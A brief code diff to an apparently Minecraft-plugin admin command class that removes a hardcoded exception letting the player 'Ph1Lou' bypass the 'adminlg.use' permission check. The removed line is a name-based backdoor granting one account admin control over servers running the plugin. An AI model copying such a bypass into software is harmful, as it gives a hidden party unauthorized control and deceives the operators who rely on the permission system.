@@ -30,7 +30,7 @@ public class AdminLG implements TabExecutor {
 		
 		if(args.length==0) return false;
 		
-		if(!sender.hasPermission("adminlg.use") && !sender.getName().equals("Ph1Lou")) {
+		if(!sender.hasPermission("adminlg.use")) {
 			sender.sendMessage(main.text.getText(116));
 			return true;
 		}
